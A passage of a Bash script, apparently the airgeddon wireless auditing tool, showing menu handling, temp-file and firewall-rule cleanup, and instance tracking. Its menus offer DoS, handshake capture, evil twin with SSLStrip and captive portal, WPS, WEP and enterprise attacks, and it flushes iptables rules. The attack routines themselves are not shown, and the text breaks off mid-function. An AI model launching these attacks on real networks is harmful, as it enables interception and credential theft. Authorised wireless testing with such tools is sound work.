			print_iface_selected
			if [ -n "${enterprise_mode}" ]; then
				print_all_target_vars
			else
				if [ "${retry_handshake_capture}" -eq 1 ]; then
					retry_handshake_capture=0
					retrying_handshake_capture=1
				fi
				print_et_target_vars
				print_iface_internet_selected
			fi
		;;
		"wps_attacks_menu")
			print_iface_selected
			print_all_target_vars_wps
		;;
		"offline_pin_generation_menu")
			print_iface_selected
			print_all_target_vars_wps
		;;
		"wep_attacks_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"beef_pre_menu")
			et_attack_adapter_prerequisites_ok=0
			print_iface_selected
			print_all_target_vars_et
		;;
		"option_menu")
			print_options
		;;
		*)
			print_iface_selected
			print_all_target_vars
		;;
	esac
}

#Clean environment vars
function clean_env_vars() {

	debug_print

	unset AIRGEDDON_AUTO_UPDATE AIRGEDDON_SKIP_INTRO AIRGEDDON_BASIC_COLORS AIRGEDDON_EXTENDED_COLORS AIRGEDDON_AUTO_CHANGE_LANGUAGE AIRGEDDON_SILENT_CHECKS AIRGEDDON_PRINT_HINTS AIRGEDDON_5GHZ_ENABLED AIRGEDDON_FORCE_IPTABLES AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING AIRGEDDON_MDK_VERSION AIRGEDDON_PLUGINS_ENABLED AIRGEDDON_DEVELOPMENT_MODE AIRGEDDON_DEBUG_MODE AIRGEDDON_WINDOWS_HANDLING
}

#Control the status of the routing taking into consideration instances orchestration
function control_routing_status() {

	debug_print

	local saved_routing_status_found=""
	local original_routing_status=""
	local etset=""
	local agpid=""
	local et_still_running=0

	if [ "${1}" = "start" ]; then
		readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat < "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
		for item in "${AIRGEDDON_PIDS[@]}"; do
			[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && etset="${BASH_REMATCH[1]}" && agpid="${BASH_REMATCH[2]}"
			if [ -z "${saved_routing_status_found}" ]; then
				[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && saved_routing_status_found="${BASH_REMATCH[3]}"
			fi

			if [[ "${agpid_to_use}" = "${agpid}" ]] && [[ "${etset}" != "et" ]]; then
				sed -ri "s:^(${agpid}):et\1:" "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null
			fi
		done

		if [ -z "${saved_routing_status_found}" ]; then
			original_routing_status=$(cat /proc/sys/net/ipv4/ip_forward)
			sed -ri "s:^(et${agpid_to_use})$:\1rs${original_routing_status}:" "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null
		fi
	else
		readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat < "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
		for item in "${AIRGEDDON_PIDS[@]}"; do
			[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && etset="${BASH_REMATCH[1]}" && agpid="${BASH_REMATCH[2]}"
			if [ -z "${saved_routing_status_found}" ]; then
				[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && saved_routing_status_found="${BASH_REMATCH[3]}"
			fi

			if [[ "${agpid_to_use}" = "${agpid}" ]] && [[ "${etset}" = "et" ]]; then
				sed -ri "s:^(et${agpid}):${agpid}:" "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null
			fi

			if [[ "${agpid_to_use}" != "${agpid}" ]] && [[ "${etset}" = "et" ]]; then
				et_still_running=1
			fi
		done

		if [[ -n "${saved_routing_status_found}" ]] && [[ "${et_still_running}" -eq 0 ]]; then
			original_routing_status="${saved_routing_status_found//[^0-9]/}"
			echo "${original_routing_status}" > /proc/sys/net/ipv4/ip_forward 2> /dev/null
		fi
	fi
}

#Clean temporary files
function clean_tmpfiles() {

	debug_print

	if [ "${1}" = "exit_script" ]; then
		rm -rf "${tmpdir}" > /dev/null 2>&1
		if is_last_airgeddon_instance; then
			delete_instance_orchestrator_file
		fi
	else
		rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
		rm -rf "${tmpdir}target.txt" > /dev/null 2>&1
		rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
		rm -rf "${tmpdir}identities"* > /dev/null 2>&1
		rm -rf "${tmpdir}decloak"* > /dev/null 2>&1
		rm -rf "${tmpdir}pmkid"* > /dev/null 2>&1
		rm -rf "${tmpdir}nws"* > /dev/null 2>&1
		rm -rf "${tmpdir}clts"* > /dev/null 2>&1
		rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
		rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
		rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1
		rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
		rm -rf "${tmpdir}${et_processesfile}" > /dev/null 2>&1
		rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
		rm -rf "${scriptfolder}${hostapd_wpe_default_log}" > /dev/null 2>&1
		rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${dnsmasq_file}" >/dev/null 2>&1
		rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
		rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
		rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
		rm -rf "${tmpdir}${bettercap_config_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${webserver_log}" > /dev/null 2>&1
		rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
		rm -rf "${tmpdir}${certsdir}" > /dev/null 2>&1
		rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
		rm -rf "${tmpdir}${asleap_pot_tmp}" > /dev/null 2>&1
		rm -rf "${tmpdir}wps"* > /dev/null 2>&1
		rm -rf "${tmpdir}${wps_attack_script_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
		rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
		rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
		rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
		rm -rf "${tmpdir}dos_pm"* > /dev/null 2>&1
		rm -rf "${tmpdir}${channelfile}" > /dev/null 2>&1
		rm -rf "${tmpdir}${wep_besside_log}" > /dev/null 2>&1
		rm -rf "${tmpdir}wep.cap" > /dev/null 2>&1
		rm -rf "${tmpdir}wps.cap" > /dev/null 2>&1
		rm -rf "${tmpdir}besside.log" > /dev/null 2>&1
		rm -rf "${tmpdir}decloak.log" > /dev/null 2>&1
	fi

	if [ "${dhcpd_path_changed}" -eq 1 ]; then
		rm -rf "${dhcp_path}" > /dev/null 2>&1
	fi

	if [ "${beef_found}" -eq 1 ]; then
		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
	fi
}

#Manage cleaning firewall rules and restore orginal routing state
function clean_routing_rules() {

	debug_print

	control_routing_status "end"
	clean_initialize_iptables_nftables "end"

	if is_last_airgeddon_instance && [[ -n "${system_tmpdir}${routing_tmp_file}" ]]; then
		restore_iptables_nftables
		rm -rf "${system_tmpdir}${routing_tmp_file}" > /dev/null 2>&1
	fi
}

#Save iptables/nftables rules
function save_iptables_nftables() {

	debug_print

	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" list ruleset > "${system_tmpdir}${routing_tmp_file}" 2> /dev/null
	else
		"${iptables_cmd}-save" > "${system_tmpdir}${routing_tmp_file}" 2> /dev/null
	fi
}

#Restore iptables/nftables rules
function restore_iptables_nftables() {

	debug_print

	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" -f "${system_tmpdir}${routing_tmp_file}" 2> /dev/null
	else
		"${iptables_cmd}-restore" < "${system_tmpdir}${routing_tmp_file}" 2> /dev/null
	fi
}

#Prepare iptables/nftables after a clean to avoid errors
function prepare_iptables_nftables() {

	debug_print

	clean_this_instance_iptables_nftables

	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" add table ip filter_"${airgeddon_instance_name}"
		"${iptables_cmd}" add chain ip filter_"${airgeddon_instance_name}" forward_"${airgeddon_instance_name}" '{type filter hook forward priority 0; policy accept;}'
		"${iptables_cmd}" add chain ip filter_"${airgeddon_instance_name}" input_"${airgeddon_instance_name}" '{type filter hook input priority 0;}'
		"${iptables_cmd}" add table ip nat_"${airgeddon_instance_name}"
		"${iptables_cmd}" add chain ip nat_"${airgeddon_instance_name}" prerouting_"${airgeddon_instance_name}" '{type nat hook prerouting priority -100;}'
		"${iptables_cmd}" add chain ip nat_"${airgeddon_instance_name}" postrouting_"${airgeddon_instance_name}" '{type nat hook postrouting priority 100;}'
	else
		"${iptables_cmd}" -P FORWARD ACCEPT
		"${iptables_cmd}" -t filter -N input_"${airgeddon_instance_name}"
		"${iptables_cmd}" -A INPUT -j input_"${airgeddon_instance_name}"
		"${iptables_cmd}" -t filter -N forward_"${airgeddon_instance_name}"
		"${iptables_cmd}" -A FORWARD -j forward_"${airgeddon_instance_name}"
	fi
}

#Clean only this instance iptables/nftables rules
function clean_this_instance_iptables_nftables() {

	debug_print

	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" delete table filter_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" delete table nat_"${airgeddon_instance_name}" 2> /dev/null
	else
		"${iptables_cmd}" -D INPUT -j input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -D FORWARD -j forward_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -F input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -F forward_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -X input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -X forward_"${airgeddon_instance_name}" 2> /dev/null
	fi
}

#Clean all iptables/nftables rules
function clean_all_iptables_nftables() {

	debug_print

	if [ "${iptables_nftables}" -eq 1 ]; then
		"${iptables_cmd}" flush ruleset 2> /dev/null
	else
		"${iptables_cmd}" -F 2> /dev/null
		"${iptables_cmd}" -t nat -F 2> /dev/null
		"${iptables_cmd}" -t mangle -F 2> /dev/null
		"${iptables_cmd}" -t raw -F 2> /dev/null
		"${iptables_cmd}" -t security -F 2> /dev/null
		"${iptables_cmd}" -t mangle -X 2> /dev/null
		"${iptables_cmd}" -t raw -X 2> /dev/null
		"${iptables_cmd}" -t security -X 2> /dev/null
		"${iptables_cmd}" -D INPUT -j input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -D FORWARD -j forward_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -F input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -F forward_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -X input_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -X forward_"${airgeddon_instance_name}" 2> /dev/null
		"${iptables_cmd}" -X 2> /dev/null
		"${iptables_cmd}" -t nat -X 2> /dev/null
	fi
}

#Contains the logic to decide what iptables/nftables rules to clean
function clean_initialize_iptables_nftables() {

	debug_print

	if [ "${1}" = "start" ]; then
		if [[ "${clean_all_iptables_nftables}" -eq 1 ]] && is_first_routing_modifier_airgeddon_instance; then
			clean_all_iptables_nftables
		fi
		prepare_iptables_nftables
	else
		if is_last_airgeddon_instance; then
			clean_all_iptables_nftables
		else
			clean_this_instance_iptables_nftables
		fi
	fi
}

#Create an array from parameters
function store_array() {

	debug_print

	local values=("${@:3}")
	for i in "${!values[@]}"; do
		eval "${1}[\$2|${i}]=\${values[i]}"
	done
}

#Check if something (first parameter) is inside an array (second parameter)
contains_element() {

	debug_print

	local e
	for e in "${@:2}"; do
		[[ "${e}" = "${1}" ]] && return 0
	done
	return 1
}

#Print hints from the different hint pools depending on the menu
function print_hint() {

	debug_print

	declare -A hints

	case ${1} in
		"main_menu")
			store_array hints main_hints "${main_hints[@]}"
			hintlength=${#main_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[main_hints|${randomhint}]}
		;;
		"dos_attacks_menu")
			store_array hints dos_hints "${dos_hints[@]}"
			hintlength=${#dos_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[dos_hints|${randomhint}]}
		;;
		"handshake_pmkid_decloaking_tools_menu")
			store_array hints handshake_pmkid_decloaking_hints "${handshake_pmkid_decloaking_hints[@]}"
			hintlength=${#handshake_pmkid_decloaking_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[handshake_pmkid_decloaking_hints|${randomhint}]}
		;;
		"dos_handshake_decloak_menu")
			store_array hints dos_handshake_decloak_hints "${dos_handshake_decloak_hints[@]}"
			hintlength=${#dos_handshake_decloak_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[dos_handshake_decloak_hints|${randomhint}]}
		;;
		"decrypt_menu")
			store_array hints decrypt_hints "${decrypt_hints[@]}"
			hintlength=${#decrypt_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[decrypt_hints|${randomhint}]}
		;;
		"personal_decrypt_menu")
			store_array hints personal_decrypt_hints "${personal_decrypt_hints[@]}"
			hintlength=${#personal_decrypt_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[personal_decrypt_hints|${randomhint}]}
		;;
		"enterprise_decrypt_menu")
			store_array hints enterprise_decrypt_hints "${enterprise_decrypt_hints[@]}"
			hintlength=${#enterprise_decrypt_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[enterprise_decrypt_hints|${randomhint}]}
		;;
		"select_interface_menu")
			store_array hints select_interface_hints "${select_interface_hints[@]}"
			hintlength=${#select_interface_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[select_interface_hints|${randomhint}]}
		;;
		"language_menu")
			store_array hints language_hints "${language_hints[@]}"
			hintlength=${#language_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[language_hints|${randomhint}]}
		;;
		"option_menu")
			store_array hints option_hints "${option_hints[@]}"
			hintlength=${#option_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[option_hints|${randomhint}]}
		;;
		"evil_twin_attacks_menu")
			store_array hints evil_twin_hints "${evil_twin_hints[@]}"
			hintlength=${#evil_twin_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[evil_twin_hints|${randomhint}]}
		;;
		"et_dos_menu")
			store_array hints evil_twin_dos_hints "${evil_twin_dos_hints[@]}"
			hintlength=${#evil_twin_dos_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[evil_twin_dos_hints|${randomhint}]}
		;;
		"wps_attacks_menu"|"offline_pin_generation_menu")
			store_array hints wps_hints "${wps_hints[@]}"
			hintlength=${#wps_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[wps_hints|${randomhint}]}
		;;
		"wep_attacks_menu")
			store_array hints wep_hints "${wep_hints[@]}"
			hintlength=${#wep_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[wep_hints|${randomhint}]}
		;;
		"beef_pre_menu")
			store_array hints beef_hints "${beef_hints[@]}"
			hintlength=${#beef_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[beef_hints|${randomhint}]}
		;;
		"enterprise_attacks_menu")
			store_array hints enterprise_hints "${enterprise_hints[@]}"
			hintlength=${#enterprise_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
			strtoprint=${hints[enterprise_hints|${randomhint}]}
		;;
	esac

	if "${AIRGEDDON_PRINT_HINTS:-true}"; then
		print_simple_separator
		language_strings "${language}" "${strtoprint}" "hint"
	fi
	print_simple_separator
}

#Initialize instances related actions
function initialize_instance_settings() {

	debug_print

	agpid_to_use="${BASHPID}"

	instance_setter
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		if hash tmux 2> /dev/null; then
			local current_tmux_display_name
			current_tmux_display_name=$(tmux display-message -p '#W')
			if [ "${current_tmux_display_name}" = "${tmux_main_window}" ]; then
				create_instance_orchestrator_file
				register_instance_pid
			fi
		fi
	else
		create_instance_orchestrator_file
		register_instance_pid
	fi
}

#Detect number of the alive airgeddon instances and set the next one if apply
function instance_setter() {

	debug_print

	local create_dir=0
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		if hash tmux 2> /dev/null; then
			local current_tmux_display_name
			current_tmux_display_name=$(tmux display-message -p '#W')
			if [ "${current_tmux_display_name}" = "${tmux_main_window}" ]; then
				create_dir=1
			fi
		fi
	else
		create_dir=1
	fi

	if [ "${create_dir}" -eq 1 ]; then
		local dir_number="1"
		airgeddon_instance_name="ag${dir_number}"
		local airgeddon_instance_dir="${airgeddon_instance_name}/"

		if [ -d "${system_tmpdir}${airgeddon_instance_dir}" ]; then
			while true; do
				dir_number=$((dir_number + 1))
				airgeddon_instance_name="ag${dir_number}"
				airgeddon_instance_dir="${airgeddon_instance_name}/"
				if [ ! -d "${system_tmpdir}${airgeddon_instance_dir}" ]; then
					break
				fi
			done
		fi

		tmpdir="${system_tmpdir}${airgeddon_instance_dir}"
		mkdir -p "${tmpdir}" > /dev/null 2>&1
	fi
}

#Create orchestrator file if needed
function create_instance_orchestrator_file() {

	debug_print

	if [ ! -f "${system_tmpdir}${ag_orchestrator_file}" ]; then
		touch "${system_tmpdir}${ag_orchestrator_file}" > /dev/null 2>&1
	else
		local airgeddon_pid_alive=0
		local agpid=""

		readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat < "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
		for item in "${AIRGEDDON_PIDS[@]}"; do
			[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && agpid="${BASH_REMATCH[2]}"
			if ps -p "${agpid}" > /dev/null 2>&1; then
				airgeddon_pid_alive=1
				break
			fi
		done

		if [ "${airgeddon_pid_alive}" -eq 0 ]; then
			rm -rf "${system_tmpdir}${ag_orchestrator_file}" > /dev/null 2>&1
			touch "${system_tmpdir}${ag_orchestrator_file}" > /dev/null 2>&1
		fi
	fi
}

#Delete orchestrator file if exists
function delete_instance_orchestrator_file() {

	debug_print

	if [ -f "${system_tmpdir}${ag_orchestrator_file}" ]; then
		rm -rf "${system_tmpdir}${ag_orchestrator_file}" > /dev/null 2>&1
	fi
}

#Register instance pid into orchestrator file if is not already registered
function register_instance_pid() {

	debug_print

	if [ -f "${system_tmpdir}${ag_orchestrator_file}" ]; then
		if ! grep -q "${agpid_to_use}" "${system_tmpdir}${ag_orchestrator_file}"; then
			{
			echo "${agpid_to_use}"
			} >> "${system_tmpdir}${ag_orchestrator_file}"
		fi
	fi
}

#Detect and return the number of airgeddon running instances
function detect_running_instances() {

	debug_print

	airgeddon_running_instances_counter=1

	readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat < "${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
	for item in "${AIRGEDDON_PIDS[@]}"; do
		[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && agpid="${BASH_REMATCH[2]}"
		if [[ "${agpid}" != "${BASHPID}" ]] && ps -p "${agpid}" > /dev/null 2>&1; then
			airgeddon_running_instances_counter=$((airgeddon_running_instances_counter + 1))
		fi
	done

	return "${airgeddon_running_instances_counter}"
}

#Check if this instance is the first one modifying routing state
function is_first_routing_modifier_airgeddon_instance() {

	debug_print

	local agpid=""

	readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat <"${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
	for item in "${AIRGEDDON_PIDS[@]}"; do
		[[ "${item}" =~ ^(et)?([0-9]+)rs[0-1]$ ]] && agpid="${BASH_REMATCH[2]}"

		if [ "${agpid}" = "${BASHPID}" ]; then
			clean_all_iptables_nftables=0
			return 0
		fi
	done

	return 1
}

#Check if this instance is the last airgeddon instance running
function is_last_airgeddon_instance() {

	debug_print

	local agpid=""

	readarray -t AIRGEDDON_PIDS 2> /dev/null < <(cat <"${system_tmpdir}${ag_orchestrator_file}" 2> /dev/null)
	for item in "${AIRGEDDON_PIDS[@]}"; do
		[[ "${item}" =~ ^(et)?([0-9]+)(rs[0-1])?$ ]] && agpid="${BASH_REMATCH[2]}"

		if [[ "${agpid}" != "${agpid_to_use}" ]] && ps -p "${agpid}" >/dev/null 2>&1; then
			return 1
		fi
	done

	return 0
}

#airgeddon main menu
function main_menu() {

	debug_print

	clear
	language_strings "${language}" 101 "title"
	current_menu="main_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 61
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	print_simple_separator
	language_strings "${language}" 118
	language_strings "${language}" 119
	language_strings "${language}" 169
	language_strings "${language}" 252
	language_strings "${language}" 333
	language_strings "${language}" 426
	language_strings "${language}" 57
	print_simple_separator
	language_strings "${language}" 60
	language_strings "${language}" 444
	print_hint ${current_menu}

	read -rp "> " main_option
	case ${main_option} in
		0)
			exit_script_option
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			dos_attacks_menu
		;;
		5)
			handshake_pmkid_decloaking_tools_menu
		;;
		6)
			decrypt_menu
		;;
		7)
			evil_twin_attacks_menu
		;;
		8)
			wps_attacks_menu
		;;
		9)
			wep_attacks_menu
		;;
		10)
			enterprise_attacks_menu
		;;
		11)
			credits_option
		;;
		12)
			option_menu
		;;
		*)
			invalid_menu_option
		;;
	esac

	main_menu
}

#Enterprise attacks menu
function enterprise_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 84 "title"
	current_menu="enterprise_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 627 "separator"
	language_strings "${language}" 628 enterprise_certificates_dependencies[@]
	language_strings "${language}" 117 "separator"
	language_strings "${language}" 260 enterprise_attack_dependencies[@]
	language_strings "${language}" 248 "separator"
	language_strings "${language}" 307 enterprise_attack_dependencies[@]
	language_strings "${language}" 740 "separator"
	language_strings "${language}" 741 enterprise_identities_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " enterprise_option
	case ${enterprise_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option "WPA" "enterprise"
		;;
		5)
			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				custom_certificates_questions
				create_certificates_config_files
				create_custom_certificates
			fi
		;;
		6)
			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_enterprise_attack_adapter_prerequisites_ok=1
						fi
					else
						et_enterprise_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_enterprise_attack_adapter_prerequisites_ok}" -eq 1 ]; then
						if custom_certificates_integration; then
							enterprise_mode="smooth"
							et_dos_menu "enterprise"
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		7)
			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_enterprise_attack_adapter_prerequisites_ok=1
						fi
					else
						et_enterprise_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_enterprise_attack_adapter_prerequisites_ok}" -eq 1 ]; then
						if custom_certificates_integration; then
							enterprise_mode="noisy"
							et_dos_menu "enterprise"
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			if contains_element "${enterprise_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				enterprise_identities
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	enterprise_attacks_menu
}

#Evil Twin attacks menu
function evil_twin_attacks_menu() {

	debug_print

	clear
	language_strings "${language}" 253 "title"
	current_menu="evil_twin_attacks_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 59
	language_strings "${language}" 48
	language_strings "${language}" 55
	language_strings "${language}" 56
	language_strings "${language}" 49
	language_strings "${language}" 255 "separator"
	language_strings "${language}" 256 et_onlyap_dependencies[@]
	language_strings "${language}" 257 "separator"
	language_strings "${language}" 259 et_sniffing_dependencies[@]
	language_strings "${language}" 261 et_sniffing_sslstrip2_dependencies[@]
	language_strings "${language}" 396
	language_strings "${language}" 262 "separator"
	language_strings "${language}" 263 et_captive_portal_dependencies[@]
	print_hint ${current_menu}

	read -rp "> " et_option
	case ${et_option} in
		0)
			return
		;;
		1)
			select_interface
		;;
		2)
			monitor_option "${interface}"
		;;
		3)
			managed_option "${interface}"
		;;
		4)
			explore_for_targets_option
		;;
		5)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_attack_adapter_prerequisites_ok=1
						fi
					else
						et_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_attack_adapter_prerequisites_ok}" -eq 1 ]; then

						declare -gA ports_needed
						ports_needed["tcp"]=""
						ports_needed["udp"]="${dhcp_port}"
						if check_busy_ports; then

							et_mode="et_onlyap"
							et_dos_menu
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		6)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_attack_adapter_prerequisites_ok=1
						fi
					else
						et_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_attack_adapter_prerequisites_ok}" -eq 1 ]; then

						declare -gA ports_needed
						ports_needed["tcp"]=""
						ports_needed["udp"]="${dhcp_port}"
						if check_busy_ports; then

							et_mode="et_sniffing"
							et_dos_menu
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		7)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					get_bettercap_version
					if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}" && ! compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_sslstrip_working_version}"; then
						echo
						language_strings "${language}" 174 "red"
						language_strings "${language}" 115 "read"
					else
						if [ "${card_vif_support}" -eq 0 ]; then
							ask_yesno 696 "no"
							if [ "${yesno}" = "y" ]; then
								et_attack_adapter_prerequisites_ok=1
							fi
						else
							et_attack_adapter_prerequisites_ok=1
						fi

						if [ "${et_attack_adapter_prerequisites_ok}" -eq 1 ]; then

							declare -gA ports_needed
							ports_needed["tcp"]="${bettercap_proxy_port}"
							ports_needed["udp"]="${dhcp_port} ${bettercap_dns_port}"
							if check_busy_ports; then

								et_mode="et_sniffing_sslstrip2"
								et_dos_menu
							fi
						fi
					fi
				else
					echo
					language_strings "${language}" 281 "red"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			beef_pre_menu
		;;
		9)
			if contains_element "${et_option}" "${forbidden_options[@]}"; then
				forbidden_menu_option
			else
				current_iface_on_messages="${interface}"
				if check_interface_wifi "${interface}"; then
					if [ "${card_vif_support}" -eq 0 ]; then
						ask_yesno 696 "no"
						if [ "${yesno}" = "y" ]; then
							et_attack_adapter_prerequisites_ok=1
						fi
					else
						et_attack_adapter_prerequisites_ok=1
					fi

					if [ "${et_attack_adapter_prerequisites_ok}" -eq 1 ]; then

						declare -gA ports_needed
